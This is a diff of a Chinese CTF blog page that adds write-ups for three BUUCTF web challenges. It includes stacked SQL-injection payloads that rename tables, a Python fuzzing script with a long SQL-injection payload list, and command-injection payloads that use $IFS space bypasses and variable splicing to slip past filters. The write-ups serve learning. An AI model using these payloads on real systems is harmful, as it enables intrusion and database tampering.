@@ -100,12 +100,12 @@ youlin = Hexo</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciuja1j1j20zk0m8kjl.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclhpw3lwj20zk0m8gvw.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciryrr3rj20zk0m8nhk.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclgrvbd6j20zk0m8qv5.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicitcxhpij20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicivghyooj20zk0m8dir.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicli3sbvtj20zk0m8x6p.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicliierfjj20zk0m8npd.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclhtuo6nj20zk0m8ttm.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclgrvbd6j20zk0m8qv5.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giciusoyjnj219g0u0x56.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicljitigmj20zk0m87fp.jpg"></li>
         </ul>
       </div>
     </header>
@@ -167,6 +167,67 @@ youlin = Hexo</title>
 <p>格式：xxx.php?xxx=php://filter/convert.base64-encode/resource=xxx.php<br>利用条件：</p>
 <p>不受allow_url_include和allow_url_fopen的限制</p>
 <h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>通过|（按位或）来进行任意命令执行，直接执行后面的指令，0 | ls /查看根目录内容，0| cat /flag打印出flag</p>
+<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>1，测试 1’ or 1=1 # ,初步判定存在SQL注入。 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 #</span></span><br></pre></td></tr></table></figure>
+
+<p>再测试字段数，到3时报错，说明字段数为2</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 1 # </span></span><br></pre></td></tr></table></figure>
+
+<p>接着尝试union注入,回显了过滤的关键字。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2#</span></span><br></pre></td></tr></table></figure>
+
+<p>堆叠注入：</p>
+<p>先通过show databases爆出数据库。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show databases; #</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://tuchuangs.com/imgs/2022/10/16/a0b6ae9e9e31c3f8.png"></p>
+<p>然后用 show tables 尝试爆表。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show tables; #</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://img-blog.csdnimg.cn/20191126153703437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70"></p>
+<p>可以看到这里有两个表，我们先爆words表的内容。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show columns from words; #</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://img-blog.csdnimg.cn/2019112615410246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70"></p>
+<p>这里一个知识点，表名为数字时，要用反引号包起来查询。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show columns from `1919810931114514`; #</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://img-blog.csdnimg.cn/20191126154451163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70"></p>
+<p>解题思路：</p>
+<p>1，通过 rename 先把 words 表改名为其他的表名。</p>
+<p>2，把 1919810931114514 表的名字改为 words 。</p>
+<p>3 ，给新 words 表添加新的列名 id 。</p>
+<p>4，将 flag 改名为 data 。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure>
+
+<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>和前一题比较像，先尝试下堆叠注入</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">show</span> tables;</span><br><span class="line">Array ( [<span class="number">0</span>] =&gt; <span class="number">1</span> ) Array ( [<span class="number">0</span>] =&gt; Flag ) </span><br></pre></td></tr></table></figure>
+
+<p>输入1;show columns from Flag，返回的内容是Nonono,查一下过滤了哪些词</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://2bc458c5-21ff-4740-b290-024b3fd90a35.node4.buuoj.cn:81&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;sql-fuzz.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        data = &#123;<span class="string">&quot;query&quot;</span>: line&#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;Nonono&#x27;</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            <span class="built_in">print</span>(line.strip(),end=<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">“or “a”=“a</span><br><span class="line">&#x27;)or(‘a’=‘a</span><br><span class="line">or 1=1–</span><br><span class="line">‘or 1=1–</span><br><span class="line">a’or’ 1=1–</span><br><span class="line">&quot;or 1=1–</span><br><span class="line">‘or’a’=‘a</span><br><span class="line">“or”=&quot;a’=‘a</span><br><span class="line">‘or’’=’</span><br><span class="line">‘or’=‘or’</span><br><span class="line">1 or ‘1’=‘1’=1</span><br><span class="line">1 or ‘1’=‘1’ or 1=1</span><br><span class="line">&#x27;OR 1=1</span><br><span class="line">“or 1=1</span><br><span class="line">&#x27;xor</span><br><span class="line">‘or 1=1/*</span><br><span class="line">1’or’1’=‘1</span><br><span class="line">a’ or 1=1–</span><br><span class="line">“a”” or 1=1–”</span><br><span class="line">or a = a</span><br><span class="line">a’ or ‘a’ = ‘a</span><br><span class="line">1 or 1=1</span><br><span class="line">a’ waitfor delay ‘0:0:10’–</span><br><span class="line">1 waitfor delay ‘0:0:10’–</span><br><span class="line">’ or 1=1</span><br><span class="line">ý or 1=1 –</span><br><span class="line">x’ AND userid IS NULL; –</span><br><span class="line">x’ AND email IS NULL; –</span><br><span class="line">anything’ OR ‘x’=‘x</span><br><span class="line">x’ AND 1=(SELECT COUNT() FROM tabname); –</span><br><span class="line">x’ AND members.email IS NULL; –</span><br><span class="line">x’ OR full_name LIKE ‘%Bob%</span><br><span class="line">23 OR 1=1</span><br><span class="line">‘%20or%20’’=’</span><br><span class="line">‘%20or%20’x’=&#x27;x</span><br><span class="line">%20or%20x=x</span><br><span class="line">‘)%20or%20(‘x’=‘x</span><br><span class="line">0 or 1=1</span><br><span class="line">’ or 0=0 –</span><br><span class="line">&quot; or 0=0 –</span><br><span class="line">or 0=0 –</span><br><span class="line">’ or 0=0 #</span><br><span class="line">) or (a=a</span><br><span class="line">hi or a=a</span><br><span class="line">hi or 1=1 --&quot;</span><br><span class="line">hi’ or 1=1 –</span><br><span class="line">hi’ or ‘a’=‘a</span><br><span class="line">hi’) or (‘a’=&#x27;a</span><br><span class="line">“hi”&quot;) or (&quot;“a”&quot;=&quot;“a”</span><br><span class="line">‘hi’ or ‘x’=‘x’;</span><br><span class="line">insert</span><br><span class="line">or</span><br><span class="line">order by</span><br><span class="line">delete</span><br><span class="line">update</span><br><span class="line">like</span><br><span class="line">handler</span><br><span class="line">’ or username like &#x27;%</span><br><span class="line">’ or uname like &#x27;%</span><br><span class="line">’ or userid like &#x27;%</span><br><span class="line">’ or uid like &#x27;%</span><br><span class="line">’ or user like &#x27;%</span><br><span class="line">–sp_password</span><br><span class="line">\x27UNION SELECT</span><br><span class="line">’ UNION SELECT</span><br><span class="line">’ UNION ALL SELECT</span><br><span class="line">’ or (EXISTS)</span><br><span class="line">&amp;</span><br><span class="line">’ or ‘’=’</span><br><span class="line">x’ or 1=1 or ‘x’=&#x27;y</span><br><span class="line">a’ or 3=3–</span><br><span class="line">“a”&quot; or 3=3–&quot;</span><br><span class="line">’ or 3=3</span><br><span class="line">ý or 3=3 –</span><br><span class="line">&quot;</span><br><span class="line">‘or select *</span><br><span class="line">’ or ‘x’=‘x</span><br><span class="line">&quot; or “x”=“x</span><br><span class="line">‘) or (‘x’=‘x</span><br><span class="line">&quot; or 0=0 #</span><br><span class="line">&quot;’ or 1 --’”</span><br><span class="line">&quot; or 1=1 or “”=&quot;</span><br><span class="line">&quot; or “a”=&quot;a</span><br><span class="line">“) or (“a”=“a</span><br><span class="line">hi” or “a”=“a</span><br><span class="line">hi” or 1=1 –</span><br><span class="line">hi”) or (“a”=“a</span><br><span class="line">&lt;&gt;”’%😉(&amp;+</span><br><span class="line">’ and ‘’ like ’</span><br></pre></td></tr></table></figure>
+
+<p>查询网上的wp</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入1</span><br><span class="line"></span><br><span class="line">Array ( [<span class="number">0</span>] =&gt; <span class="number">1</span> ) </span><br><span class="line"></span><br><span class="line">输入0或者其他字母均没有回显</span><br><span class="line"></span><br><span class="line">输入上面过滤的字符会显示Nonono.</span><br></pre></td></tr></table></figure>
+
+<p>综上，可以猜测后台的SQL语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $_GET[&#x27;query&#x27;] || flag from Flag</span><br></pre></td></tr></table></figure>
+
+<p>||的特点是如果前面为真，后面就不会执行，那么我们传入*,1之后语句就会变成select *,1 from Flag，而1会在表添加一列1，所以得到flag</p>
+<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>打开靶场只有一个ip，尝试给他127.0.0.1试一试</p>
+<p><img data-src="https://tuchuangs.com/imgs/2022/10/18/1c74d0d28ed8bad3.png">可以看到是ping了输入的地址，联想到前面做过的题用|可以执行后面的命令？ip=127.0.0.1|ls可以看到</p>
+<p><img data-src="https://tuchuangs.com/imgs/2022/10/18/c88b59ba0ff56de7.png"></p>
+<p>是可以执行的，但是经过后面一系列的尝试可以知道过滤了flag和空格，所以用?ip=127.0.0.1|cat$IFS$1index.php来得到源码</p>
+<p>空格绕过方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 </span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; 		//用逗号实现空格功能</span><br><span class="line">%09		//需要php环境</span><br></pre></td></tr></table></figure>
+
+<p>源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说，使用正则匹配对参数，例如{},&lt;&gt;，* ,?，空格，bash，flag等进行了过滤，才会有我们刚才看到的各种提示<br>这里观察到有个a变量，使用shell_exec命令进行了shell命令执行，然后将结果返回到a变量中,最后输出a shell_exec命令<br>ps:这里的ping -c 4就是发送4条请求<br>在这里插入图片描述<br>参考大佬们的wp<br>尝试利用a进行变量覆盖绕过flag过滤<br>构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>
+
 
   </div>
 
@@ -178,7 +239,7 @@ youlin = Hexo</title>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">Edited on</span>
-    <time title="Modified: 2022-10-14 18:23:11" itemprop="dateModified" datetime="2022-10-14T18:23:11+08:00">2022-10-14</time>
+    <time title="Modified: 2022-10-18 00:31:13" itemprop="dateModified" datetime="2022-10-18T00:31:13+08:00">2022-10-18</time>
   </span>
 </div>
 
@@ -233,7 +294,7 @@ youlin = Hexo</title>
     <div class="item left">
       
 
-  <a href="/2022/10/11/house-of-emma/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciusoyjnj219g0u0x56.jpg" title="house_of_emma">
+  <a href="/2022/10/11/house-of-emma/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclj9410cj20zk0m8h12.jpg" title="house_of_emma">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>house_of_emma</h3>
@@ -243,7 +304,7 @@ youlin = Hexo</title>
     <div class="item right">
       
 
-  <a href="/2022/10/16/docker/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciuv0socj20zk0m8qes.jpg" title="docker">
+  <a href="/2022/10/16/docker/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeyhsblkj20zk0m81kx.jpg" title="docker">
   <span class="type">Next Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>docker</h3>
@@ -265,7 +326,7 @@ youlin = Hexo</title>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="Contents">
-          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-number">1.</span> <span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-number">2.</span> <span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="toc-number">3.</span> <span class="toc-text">[极客大挑战 2019]Havefun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-number">4.</span> <span class="toc-text">[ACTF2020 新生赛]Include</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3"><span class="toc-number">4.1.</span> <span class="toc-text">知识详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php-filter"><span class="toc-number">4.1.1.</span> <span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-number">5.</span> <span class="toc-text">[ACTF2020 新生赛]Exec</span></a></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-number">1.</span> <span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-number">2.</span> <span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="toc-number">3.</span> <span class="toc-text">[极客大挑战 2019]Havefun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-number">4.</span> <span class="toc-text">[ACTF2020 新生赛]Include</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3"><span class="toc-number">4.1.</span> <span class="toc-text">知识详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php-filter"><span class="toc-number">4.1.1.</span> <span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-number">5.</span> <span class="toc-text">[ACTF2020 新生赛]Exec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">6.</span> <span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-number">7.</span> <span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">8.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li></ol>
       </div>
       <div class="related panel pjax" data-title="Related">
       </div>
@@ -340,7 +401,7 @@ youlin = Hexo</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/08/04/0ctf-2017-babyheap/" title="0ctf_2017_babyheap">0ctf_2017_babyheap</a></span>
+    <span><a href="/2022/09/21/aarch64/" title="aarch64">aarch64</a></span>
   </li>
 
       
@@ -356,10 +417,36 @@ youlin = Hexo</title>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/cometition/" title="In cometition">cometition</a>
 </div>
 
-    <span><a href="/2022/09/22/%E6%9F%8F%E9%B9%AD%E6%9D%AF/" title="柏鹭杯">柏鹭杯</a></span>
+    <span><a href="/2022/04/02/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2canary/" title="格式化字符串泄露canary">格式化字符串泄露canary</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/10/02/%E5%A0%86%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" title="堆利用总结">堆利用总结</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/01/io-file/" title="io_file">io_file</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/10/14/buu-web/" title="buu_web">buu_web</a></span>
   </li>
 
       
@@ -377,7 +464,7 @@ youlin = Hexo</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/10/16/docker/" title="docker">docker</a></span>
+    <span><a href="/2022/08/04/0ctf-2017-babyheap/" title="0ctf_2017_babyheap">0ctf_2017_babyheap</a></span>
   </li>
 
       
@@ -386,35 +473,7 @@ youlin = Hexo</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/04/18/%E6%A0%88%E8%BF%81%E7%A7%BB/" title="栈迁移">栈迁移</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/cometition/" title="In cometition">cometition</a>
-</div>
-
-    <span><a href="/2022/03/18/picoCTF-wp/" title="picoCTF_wp">picoCTF_wp</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/09/21/aarch64/" title="aarch64">aarch64</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/09/14/house-of-cat/" title="house_of_cat">house_of_cat</a></span>
+    <span><a href="/2022/04/10/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" title="整数溢出">整数溢出</a></span>
   </li>
 
       
